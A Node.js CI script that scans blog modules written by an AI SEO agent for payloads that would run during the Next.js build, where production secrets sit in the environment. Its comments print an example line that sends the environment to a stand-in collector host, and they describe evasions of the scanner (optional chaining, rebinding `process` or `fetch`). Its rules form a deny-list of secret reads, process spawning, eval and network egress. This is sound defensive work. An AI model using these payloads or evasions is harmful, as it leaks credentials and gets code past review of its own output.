#!/usr/bin/env node
/**
 * check-agent-blog-content.mjs — content tripwire on agent-authored blog posts.
 *
 * ---------------------------------------------------------------------------
 * WHY THIS EXISTS
 * ---------------------------------------------------------------------------
 * `build-chain-guard` (.github/workflows/ci.yml) stops a non-owner from
 * touching postcss.config.mjs, next.config.mjs, package.json, .github/**, etc.
 * It deliberately lets `app/blog/**` through, because that is the SEO agent's
 * legitimate output.
 *
 * That is NOT the same as `app/blog/**` being harmless.
 *
 * Blog posts in this repo are TSX **server component modules**
 * (`app/blog/<slug>/page.tsx` — each one exports `metadata` and a default
 * component, and imports from `@/lib` and `@/components`). Next.js statically
 * renders them during `next build`. So BOTH of these run on the Vercel builder,
 * with SUPABASE_SERVICE_ROLE_KEY, STRIPE_SECRET_KEY, STRIPE_WEBHOOK_SECRET,
 * RESEND_API_KEY, CRON_SECRET and SENTRY_AUTH_TOKEN in the environment:
 *
 *   1. the module's top-level code, and
 *   2. the body of the exported server component.
 *
 * That is the same terminus as the 2026-06-01 postcss.config.mjs incident.
 * Confining the agent's write scope to `app/blog/**` therefore does not close
 * the build-execution path — it only changes which file the payload lives in.
 *
 * This script is the content-level check that makes the *path* allowlist mean
 * something: for changes NOT authored by the repo owner, a touched blog module
 * must read like a blog post, not like a program.
 *
 * `lib/blog-topics.ts` is checked by the same call for the same reason: the SEO
 * prompt tells the agent to register every post in it, and it is imported by
 * `app/blog/page.tsx`, `app/blog/topics/**` and `app/sitemap.ts`, all of which
 * `next build` renders statically. It is agent-writable and build-executed, so
 * it belongs in this scan.
 *
 * ---------------------------------------------------------------------------
 * WHAT IT IS AND IS NOT
 * ---------------------------------------------------------------------------
 * It IS: a deny-list of tokens that have no business in a prose article and
 * that a naive injected payload needs — secret access, process spawning,
 * dynamic evaluation, network egress, node builtins.
 *
 * It is NOT a proof of safety. It is a raw-text scan, not a parse. A determined
 * attacker who knows this file exists can build an equivalent payload out of
 * tokens it does not list (computed property access, string concatenation,
 * character codes, an innocuous-looking import from a component the check does
 * not cover). Treat a pass as "no obvious payload", never as "reviewed".
 *
 * The only control here that does not depend on guessing the payload's shape
 * is a human reading the diff. See docs/SECURITY-HARDENING.md.
 *
 * ---------------------------------------------------------------------------
 * USAGE
 * ---------------------------------------------------------------------------
 *   node scripts/check-agent-blog-content.mjs app/blog/foo/page.tsx [...]
 *
 * Exit 0 = no findings. Exit 1 = findings, a bad invocation, or ANY path this
 * script could not read.
 *
 * ---------------------------------------------------------------------------
 * IT FAILS CLOSED (changed 2026-08-03)
 * ---------------------------------------------------------------------------
 * It used to *skip* a path that did not exist, on the theory that the path had
 * been deleted in the diff. That turned a quoting bug in the caller into a
 * silent pass: `.github/workflows/ci.yml` expanded the module list unquoted, so
 * `app/blog/best rental tool/page.tsx` arrived as three fragments, none of them
 * a real file, all three "skipped" — and a post exfiltrating `process.env`
 * reported OK. Deletions are now filtered out by the caller (it sends only
 * paths whose git status is not `D`), and anything this script cannot read is a
 * hard failure. If that ever fires on a genuine deletion, fix the caller; do
 * not restore the skip.
 *
 * Symlinks are refused outright. A symlink means the bytes `next build`
 * executes are not the bytes at the path the guard matched, and reasoning about
 * that is not worth it — a blog module is a regular file.
 *
 * Only .ts/.tsx/.js/.jsx/.mjs/.cjs files are scanned; .mdx/.md/images are not
 * executed as modules and are skipped — but if EVERY argument is skipped, that
 * is treated as a failure too, because "scanned nothing, found nothing" is
 * exactly what a caller bug looks like.
 *
 * No dependencies — node builtins only, so it runs with a bare `setup-node`
 * and no `npm ci`.
 */

import { readFileSync, lstatSync, appendFileSync } from 'node:fs'
import { isAbsolute, normalize, sep } from 'node:path'

const DOC = 'docs/SECURITY-HARDENING.md'

/**
 * Build the two match forms for a call-shaped token.
 *
 *   form A: `name(`        — no space before the paren. That is code, and prose
 *                            essentially never writes it.
 *   form B: `name  ("...`  — spaced, but immediately followed by a string
 *                            literal, which prose does not do either.
 *
 * The split exists to avoid false-positives on ordinary real-estate copy:
 * "lenders require (at minimum) 20% down", "properties that fetch (on average)
 * $2,000", "import (multifamily mode)" — all of which are `name<space>(` with
 * no string literal after it, and all of which appear in, or plausibly could
 * appear in, the existing 77-post corpus.
 */
/**
 * `(?:\?\.)?` on every call/member form: optional chaining is semantically
 * identical (`process?.env` IS `process.env`) but a literal-dot/paren rule
 * misses it, so ONE `?` character defeated four of the eight rule families
 * below — including the two this check leads with. Found by an adversarial
 * review that reproduced it end-to-end: a blog module doing
 * `const t = process?.env` + `void fetch?.("https://…", { body: JSON.stringify(t) })`
 * scanned clean and exited 0, while the byte-identical payload without the two
 * `?` characters exited 1. It is also just ordinary modern TS style, so this
 * would have failed open by accident, not only under attack.
 */
function callForms(name) {
  return [
    new RegExp(`\\b${name}(?:\\?\\.)?\\(`),
    new RegExp(`\\b${name}\\s*(?:\\?\\.)?\\s*\\(\\s*["'\`]`),
  ]
}

/**
 * The globals a payload needs, matched as BINDINGS rather than as call sites.
 *
 * Every rule above keys on the identifier being immediately followed by `(`,
 * `.` or `[`. Rebinding it first defeats all of them, with no obfuscation and
 * no cleverness:
 *
 *     const { env } = process        // `process` in trailing position
 *     const send = fetch             // no paren after `fetch`
 *     await send("https://collector.example/i", { body: JSON.stringify(env) })
 *
 * That scanned clean and exited 0 while the byte-identical payload written as
 * `process.env` + `fetch(` exited 1 — a fail-open in the one place this check
 * claims to work, found by an adversarial review that reproduced it. Both
 * constructs are also idiomatic TS a model would write unprompted, so it could
 * fail open by accident and not only under attack.
 *
 * The forms below are the ones prose cannot produce: an identifier on the right
 * of `=`, `=>`, `return` or `...`, or sitting alone as an argument or an object
 * value. "The closing process," survives; `= process` does not. They are also
 * matched against the CODE PROJECTION (see projectCode) rather than the raw
 * text, so an article that happens to discuss the "escrow process" in a
 * sentence is not a finding.
 */
const ALIASABLE = [
  'process',
  'fetch',
  'require',
  'eval',
  'Function',
  'globalThis',
  'Buffer',
  'atob',
  'btoa',
  'XMLHttpRequest',
  'WebSocket',
  'child_process',
  '__dirname',
  '__filename',
]

function bindingForms(name) {
  return [
    // `= process` · `=> fetch` · `return require` · `...process`
    new RegExp(`(?:=>|=|\\breturn|\\.\\.\\.)\\s*\\b${name}\\b`),
    // `f(process)` · `[fetch, x]` · `{ k: process }` — the identifier standing
    // alone as a value, with a closing delimiter after it.
    new RegExp(`[(,\\[:]\\s*\\b${name}\\b\\s*(?=[),\\]}])`),
  ]
}

/**
 * Reduce a TSX module to the parts that are code, so the binding rules above
 * can match aggressively without tripping on an article that uses one of these
 * words in a sentence.
 *
 * Two removals, both conservative:
 *
 *   1. Comments. `//` only when it is not the `//` of a URL scheme.
 *   2. JSX text. A span between `>` and `<` containing neither `<` nor `>` is
 *      the text of an element. Brace expressions inside it are kept — that is
 *      where `{fetch("…")}` would live — and everything else in the span is
 *      dropped as prose.
 *
 * String literals are deliberately NOT stripped: a naive scanner would read the
 * apostrophe in "don't" as opening one and swallow the rest of the file, which
 * is a fail-open. Leaving them in can only produce a false POSITIVE, and the
 * binding forms need JS punctuation that prose inside a string does not have.
 *
 * This is a projection, not a parse. It exists to lower false positives on a
 * high-signal rule, not to be a security boundary of its own.
 */
function projectCode(raw) {
  let out = raw.replace(/\/\*[\s\S]*?\*\//g, ' ')
  out = out.replace(/(^|[^:])\/\/[^\n]*/g, '$1 ')
  out = out.replace(/>([^<>]*)</g, (_m, inner) => {
    if (!inner.includes('{')) return '><'
    // Keep balanced brace regions; drop the prose around them.
    const kept = []
    let depth = 0
    let start = -1
    for (let i = 0; i < inner.length; i += 1) {
      const ch = inner[i]
      if (ch === '{') {
        if (depth === 0) start = i
        depth += 1
      } else if (ch === '}') {
        depth -= 1
        if (depth === 0 && start !== -1) {
          kept.push(inner.slice(start, i + 1))
          start = -1
        }
        if (depth < 0) depth = 0
      }
    }
    if (depth > 0 && start !== -1) kept.push(inner.slice(start))
    return `>${kept.join(' ')}<`
  })
  return out
}

/**
 * Each rule: what it catches, and why a blog post has no reason to contain it.
 * Order is severity-ish; all of them fail the check.
 */
const RULES = [
  {
    id: 'process-env',
    why: 'reads the build environment — this is where the production secrets are',
    patterns: [/\bprocess\s*\??\s*\.\s*env\b/, /\bprocess\s*(?:\?\.)?\s*\[/, /\bprocess\s*\??\s*\.\s*(?:argv|cwd|exit|binding|mainModule|dlopen)\b/],
  },
  {
    id: 'child-process',
    why: 'spawns a program on the builder',
    patterns: [/\bchild_process\b/, /\bexecSync\b/, /\bexecFileSync\b/, /\bspawnSync\b/],
  },
  {
    id: 'node-builtin-import',
    why: 'a blog post imports from @/lib and @/components, never from a node builtin',
    patterns: [
      /["']node:[a-z_/]+["']/,
      /\bfrom\s*["'](?:fs|fs\/promises|path|os|crypto|http|https|net|dns|tls|vm|worker_threads|module|process|util|stream|zlib|cluster|v8|perf_hooks|inspector)["']/,
    ],
  },
  {
    id: 'dynamic-eval',
    why: 'evaluates code built at runtime, which defeats every static review',
    patterns: [...callForms('eval'), /\bnew\s+Function\b/, /\bFunction\s*\(\s*["'`]/, /\bconstructor\s*\(\s*["'`]/],
  },
  {
    id: 'dynamic-require-import',
    why: 'pulls in a module chosen at runtime',
    patterns: [...callForms('require'), ...callForms('import'), /\bcreateRequire\b/],
  },
  {
    id: 'network-egress',
    why: 'a statically rendered article does not call out to the network at build time',
    patterns: [...callForms('fetch'), /\bXMLHttpRequest\b/, /\bWebSocket\b/, /\bnavigator\s*\??\s*\.\s*sendBeacon\b/],
  },
  {
    id: 'global-escape',
    why: 'the usual way to reach `process` without writing `process`',
    patterns: [/\bglobalThis\b/, /\bglobal\s*(?:\?\.)?\s*\[/, /\b__dirname\b/, /\b__filename\b/],
  },
  {
    id: 'encoding-obfuscation',
    why: 'used to hide a payload from exactly this kind of scan',
    patterns: [/\bBuffer\s*\??\s*\.\s*from\b/, ...callForms('atob'), ...callForms('btoa'), /\bString\s*\??\s*\.\s*fromCharCode\b/],
  },
  {
    id: 'aliased-global',
    why: 'rebinds a build-time global to a local name, which is how a payload reaches process.env or fetch without ever writing `process.env` or `fetch(`',
    // Matched against the code projection, not the raw text — see projectCode.
    source: 'code',
    patterns: ALIASABLE.flatMap(bindingForms),
  },
]

const SCANNED_EXT = /\.(?:tsx?|jsx?|mjs|cjs)$/

const args = process.argv.slice(2)
if (args.length === 0) {
  console.error('usage: node scripts/check-agent-blog-content.mjs <file> [<file> ...]')
  process.exit(1)
}

const findings = []
const scanned = []
const skipped = []
/** Reasons this run could not do its job. Any entry means exit 1. */
const unreadable = []

/**
 * Reject a path this script has no business opening before it opens it:
 * absolute paths, anything with a `..` segment, anything empty. The caller
 * passes repo-relative paths straight out of `git diff`; anything else means
 * the caller is not the caller we think it is.
 */
function pathIsSane(rel) {
  if (typeof rel !== 'string' || rel.length === 0) return false
  if (rel.includes('\0')) return false
  if (isAbsolute(rel)) return false
  return !normalize(rel)
    .split(sep)
    .some((seg) => seg === '..')
}

for (const rel of args) {
  if (!pathIsSane(rel)) {
    unreadable.push(`${rel} — not a repo-relative path this script will open`)
    continue
  }
  if (!SCANNED_EXT.test(rel)) {
    skipped.push(`${rel} (not an executable module)`)
    continue
  }

  // lstat, not stat: a symlink must be seen as a symlink, not as its target.
  let st
  try {
    st = lstatSync(rel)
  } catch (err) {
    unreadable.push(`${rel} — cannot stat it (${(err && err.code) || err})`)
    continue
  }
  if (st.isSymbolicLink()) {
    unreadable.push(`${rel} — is a symlink; a blog module must be a regular file`)
    continue
  }
  if (!st.isFile()) {
    unreadable.push(`${rel} — exists but is not a regular file`)
    continue
  }

  let raw
  try {
    raw = readFileSync(rel, 'utf8')
  } catch (err) {
    unreadable.push(`${rel} — cannot read it (${(err && err.code) || err})`)
    continue
  }
  const lines = raw.split(/\r?\n/)

  // Pass 1 — per line. Gives an exact line number for the report.
  //
  // Pass 2 — the same rules against the file with ALL whitespace removed, so a
  // payload cannot slip through by splitting a token across lines
  // (`require\n(`, `process\n.env`). Only reported when pass 1 found nothing
  // for that rule, because the dense form has no usable line number and is the
  // more false-positive-prone of the two.
  const dense = raw.replace(/\s+/g, '')

  // Same two passes over the code projection, for rules that would be too
  // false-positive-prone against prose. Line numbers still line up: projectCode
  // only ever replaces characters with spaces or drops text inside a line, and
  // the JSX-text pass leaves the newlines it does not touch in place.
  const code = projectCode(raw)
  const codeLines = code.split(/\r?\n/)
  const codeDense = code.replace(/\s+/g, '')

  scanned.push(rel)

  for (const rule of RULES) {
    const useCode = rule.source === 'code'
    const hay = useCode ? codeLines : lines
    const denseHay = useCode ? codeDense : dense
    let hitInPass1 = false
    for (let i = 0; i < hay.length; i += 1) {
      for (const re of rule.patterns) {
        if (re.test(hay[i])) {
          findings.push({
            rel,
            line: i + 1,
            rule,
            snippet: (lines[i] ?? hay[i]).trim().slice(0, 160),
            pass: 'line',
          })
          hitInPass1 = true
          break
        }
      }
    }
    if (hitInPass1) continue
    for (const re of rule.patterns) {
      if (re.test(denseHay)) {
        findings.push({ rel, line: null, rule, snippet: '(token split across lines/whitespace)', pass: 'dense' })
        break
      }
    }
  }
}

if (scanned.length > 0) {
  console.log(`Scanned ${scanned.length} agent-touched blog module(s):`)
  for (const rel of scanned) console.log(`  ${rel}`)
}
if (skipped.length > 0) {
  console.log('Skipped:')
  for (const s of skipped) console.log(`  ${s}`)
}

// --- fail closed ------------------------------------------------------------
//
// Two conditions, either of which means this run did not do its job and must
// not be read as a pass. Reported before the findings so the cause is the first
// thing on screen.
if (scanned.length === 0) {
  unreadable.push(
    `nothing was scanned — ${args.length} argument(s) were given and none of them ` +
      'was a readable module. That is what a caller quoting bug looks like.',
  )
}

if (unreadable.length > 0) {
  const out = []
  out.push('')
  out.push('==================================================================')
  out.push('  AGENT BLOG CONTENT CHECK COULD NOT RUN — FAILING CLOSED')
  out.push('==================================================================')
  out.push('  This check has to be able to read every module it was handed. It')
  out.push('  could not, so it cannot say anything about them — and "cannot say"')
  out.push('  is not "safe".')
  out.push('')
  for (const u of unreadable) out.push(`    ${u}`)
  out.push('')
  out.push('  The caller (.github/workflows/ci.yml, gate 1b) sends only paths')
  out.push('  that exist in HEAD, as a quoted bash array. If you are seeing this,')
  out.push('  either the caller changed or the path is not a regular file.')
  out.push('  Fix the caller. Do NOT make this script skip what it cannot read —')
  out.push('  that is the bug this replaced.')
  if (findings.length > 0) {
    out.push('')
    out.push(`  Also ${findings.length} content finding(s) in the modules that COULD be read:`)
    for (const f of findings) {
      out.push(`    ${f.rel}${f.line ? `:${f.line}` : ''}  [${f.rule.id}] ${f.rule.why}`)
    }
  }
  out.push(`  See ${DOC}.`)
  out.push('==================================================================')
  console.error(out.join('\n'))

  if (process.env.GITHUB_STEP_SUMMARY) {
    try {
      appendFileSync(
        process.env.GITHUB_STEP_SUMMARY,
        `${[
          '### agent blog content check: COULD NOT RUN (failing closed)',
          '',
          ...unreadable.map((u) => `- ${u}`),
          '',
        ].join('\n')}\n`,
      )
    } catch {
      /* summary is best-effort; the exit code is the control */
    }
  }
  process.exit(1)
}

if (findings.length === 0) {
  console.log('')
  console.log('OK — no build-execution payload markers found in the agent-touched blog modules.')
  console.log('(Heuristic scan, not a review. A pass means "no obvious payload".)')
  process.exit(0)
}

const out = []
out.push('')
out.push('==================================================================')
out.push('  AGENT BLOG CONTENT CHECK FAILED')
out.push('==================================================================')
out.push('  A blog module changed by a non-owner contains constructs that')
out.push('  execute during `next build` on the Vercel builder, where')
out.push('  SUPABASE_SERVICE_ROLE_KEY, STRIPE_SECRET_KEY, STRIPE_WEBHOOK_SECRET,')
out.push('  RESEND_API_KEY, CRON_SECRET and SENTRY_AUTH_TOKEN are in the')
out.push('  environment.')
out.push('')
out.push('  app/blog/**/page.tsx is a server component module. Its top-level')
out.push('  code AND its component body both run at build time. Being under')
out.push('  app/blog/ makes it content; it does not make it inert.')
out.push('')
out.push(`  Findings (${findings.length}):`)
for (const f of findings) {
  out.push(`    ${f.rel}${f.line ? `:${f.line}` : ''}  [${f.rule.id}] ${f.rule.why}`)
  out.push(`      ${f.snippet}`)
}
out.push('')
out.push('  If this is a genuine false positive — an article that legitimately')
out.push('  quotes one of these tokens as prose — do NOT weaken this script.')
out.push('  Open the PR from the owner account instead, having read the diff.')
out.push(`  See ${DOC}.`)
out.push('==================================================================')

const report = out.join('\n')
console.error(report)

if (process.env.GITHUB_STEP_SUMMARY) {
  try {
    const md = [
      '### agent blog content check: FAILED',
      '',
      'Build-executed constructs in blog module(s) changed by a non-owner:',
      '',
      ...findings.map((f) => `- \`${f.rel}${f.line ? `:${f.line}` : ''}\` — **${f.rule.id}**: ${f.rule.why}`),
      '',
      `> \`app/blog/**/page.tsx\` is a server component module; its top-level code and component body both run during \`next build\` with production secrets. See \`${DOC}\`.`,
      '',
    ].join('\n')
    appendFileSync(process.env.GITHUB_STEP_SUMMARY, `${md}\n`)
  } catch {
    /* summary is best-effort; the exit code is the control */
  }
}

process.exit(1)
